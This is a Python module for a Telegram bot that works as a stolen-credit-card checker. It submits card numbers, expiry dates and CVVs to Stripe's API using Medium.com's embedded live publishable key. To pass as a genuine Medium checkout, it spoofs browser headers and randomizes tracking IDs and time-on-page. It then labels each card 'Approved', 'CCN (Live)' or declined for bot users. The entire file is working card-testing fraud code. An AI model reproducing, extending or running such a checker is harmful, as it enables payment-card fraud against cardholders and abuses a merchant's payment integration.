"""
Medium Stripe Checker - Bot Integration Module
==============================================
This module integrates the Medium Stripe checker with the existing Telegram bot.
"""

import re
import time
import requests
import uuid
import random
import string
import asyncio
from concurrent.futures import ThreadPoolExecutor

# Thread pool for running sync requests
_executor = ThreadPoolExecutor(max_workers=10)


class MediumStripeChecker:
    """Medium.com Stripe Payment Checker for Bot Integration"""
    
    def __init__(self):
        self.pk_key = "pk_live_7FReX44VnNIInZwrIIx6ghjl"
        self.stripe_version = "2025-03-31.basil"
        self.session = requests.Session()
        self._setup_session()
    
    def _setup_session(self):
        """Setup session with default headers"""
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept-Language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        })
    
    def _generate_guid(self):
        """Generate random GUID for Stripe"""
        return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    def _generate_muid(self):
        """Generate random MUID for Stripe"""
        return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    def _generate_sid(self):
        """Generate random SID for Stripe"""
        return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))
    
    def _generate_client_session_id(self):
        """Generate client session ID"""
        return str(uuid.uuid4())
    
    def create_payment_method(self, cc, mm, yy, cvv):
        """Create Stripe payment method from card details"""
        # Normalize year to 2 digits
        if len(str(yy)) == 4:
            yy = str(yy)[2:]
        
        url = "https://api.stripe.com/v1/payment_methods"
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
        }
        
        guid = self._generate_guid()
        muid = self._generate_muid()
        sid = self._generate_sid()
        client_session_id = self._generate_client_session_id()
        time_on_page = random.randint(20000, 60000)
        
        data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
            'referrer': 'https://medium.com',
            'time_on_page': str(time_on_page),
            'client_attribution_metadata[client_session_id]': client_session_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': self.pk_key,
            '_stripe_version': self.stripe_version,
        }
        
        try:
            response = self.session.post(url, headers=headers, data=data, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': {'code': 'connection_error', 'message': str(e)}}
    
    def check_card_sync(self, card_string):
        """
        Synchronous card check
        
        Args:
            card_string: Card in format cc|mm|yy|cvv
        
        Returns:
            str: Response message
        """
        # Parse card string
        parts = card_string.strip().replace(' ', '').split('|')
        if len(parts) != 4:
            return "INVALID_FORMAT"
        
        cc, mm, yy, cvv = parts
        
        # Clean card number
        cc = re.sub(r'\D', '', cc)
        if len(cc) < 13 or len(cc) > 19:
            return "INVALID_CARD_NUMBER"
        
        # Normalize
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        yy = yy.zfill(2)
        
        # Create payment method
        result = self.create_payment_method(cc, mm, yy, cvv)
        
        if 'id' in result:
            return "APPROVED"
        elif 'error' in result:
            error = result['error']
            code = error.get('code', 'unknown')
            decline_code = error.get('decline_code', '')
            message = error.get('message', 'Unknown error')
            
            return self._parse_response(code, decline_code, message)
        
        return "UNKNOWN_ERROR"
    
    def _parse_response(self, code, decline_code, message):
        """Parse error response and return status"""
        decline_lower = decline_code.lower() if decline_code else ''
        code_lower = code.lower() if code else ''
        msg_lower = message.lower() if message else ''
        
        # CCN/Live responses
        ccn_indicators = [
            'insufficient_funds', 'incorrect_cvc', 'invalid_cvc',
            'incorrect_zip', 'incorrect_address', 'card_velocity_exceeded',
            'do_not_honor', 'transaction_not_allowed', 'pickup_card',
            'restricted_card', 'security_violation', 'withdrawal_count_limit_exceeded',
        ]
        
        for indicator in ccn_indicators:
            if indicator in decline_lower or indicator in code_lower or indicator in msg_lower:
                return f"CCN_{indicator.upper()}"
        
        # 3DS Required
        if 'authentication_required' in msg_lower or 'card_not_supported' in code_lower:
            return "3DS_REQUIRED"
        
        # Declined
        if any(x in decline_lower or x in code_lower for x in [
            'card_declined', 'generic_decline', 'lost_card', 'stolen_card',
            'expired_card', 'invalid_expiry', 'invalid_number', 'incorrect_number',
            'fraudulent', 'processing_error'
        ]):
            return f"DECLINED_{decline_code.upper() if decline_code else code.upper()}"
        
        # Return the decline code or code if available
        if decline_code:
            return decline_code.upper()
        elif code:
            return code.upper()
        
        return "DECLINED"


# Global checker instance
_checker = None

def get_checker():
    """Get or create checker instance"""
    global _checker
    if _checker is None:
        _checker = MediumStripeChecker()
    return _checker


async def check_card(user_id, card_string):
    """
    Async wrapper for card checking (compatible with existing bot structure)
    
    Args:
        user_id: User ID (not used, kept for compatibility)
        card_string: Card in format cc|mm|yy|cvv
    
    Returns:
        str: Response message
    """
    checker = get_checker()
    loop = asyncio.get_event_loop()
    result = await loop.run_in_executor(_executor, checker.check_card_sync, card_string)
    return result


def get_status_flag(raw_response):
    """
    Get status flag for display
    
    Args:
        raw_response: Response from check_card
    
    Returns:
        str: Status flag with emoji
    """
    response_upper = raw_response.upper() if raw_response else ""
    
    if response_upper == "APPROVED":
        return "Approved"
    elif "CCN" in response_upper:
        return "CCN (Live)"
    elif "3DS" in response_upper:
        return "3DS Required"
    elif "DECLINED" in response_upper or "INVALID" in response_upper:
        return "Declined"
    else:
        return "Unknown"


def format_medium_response(cc, mes, ano, cvv, raw_response, timet, profile):
    """
    Format response for Telegram bot display
    
    Args:
        cc: Card number
        mes: Expiry month
        ano: Expiry year  
        cvv: CVV
        raw_response: Response from check_card
        timet: Time taken
        profile: User profile HTML
    
    Returns:
        tuple: (status_flag, formatted_message)
    """
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"
    
    # Determine status
    if raw_response == "APPROVED":
        status_flag = "Approved"
    elif "CCN" in raw_response.upper():
        status_flag = "CCN (Live)"
    elif "3DS" in raw_response.upper():
        status_flag = "3DS Required"
    else:
        status_flag = "Declined"
    
    # BIN info (basic - first 6 digits)
    bin_num = cc[:6] if len(cc) >= 6 else cc
    
    # Format response message
    result = f"""
<b>[#Medium] | Stripe Auth</b>
{'='*30}
<b>[*] Card</b>: <code>{fullcc}</code>
<b>[*] Gateway</b>: <b>Medium Stripe Auth</b>
<b>[*] Status</b>: <code>{status_flag}</code>
<b>[*] Response</b>: <code>{raw_response}</code>
{'='*30}
<b>[+] Bin</b>: <code>{bin_num}</code>
{'='*30}
<b>[>] Checked By</b>: {profile}
<b>[>] Time</b>: <code>{timet}s</code>
"""
    return status_flag, result
